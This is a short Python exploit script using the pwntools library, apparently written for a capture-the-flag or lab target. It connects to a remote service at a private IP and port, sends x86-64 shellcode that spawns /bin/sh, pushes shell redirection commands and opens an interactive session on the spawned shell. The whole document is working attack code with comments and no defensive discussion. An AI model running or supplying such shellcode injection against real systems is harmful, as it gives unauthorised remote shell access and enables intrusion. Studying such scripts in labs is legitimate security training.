```py
from pwn import *

# Generate the shellcode
shellcode = b'\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'

# Connect to the target
p = remote('10.25.1.228', 9997)

# Send the shellcode, followed by a newline character
p.send(shellcode + b'\n')

# Redirect the standard input, output, and error streams to the socket connection
p.send(b'exec 2>&1\n')
p.send(b'exec 0<&1\n')

# Interact with the shell that the shellcode spawns
p.interactive()
```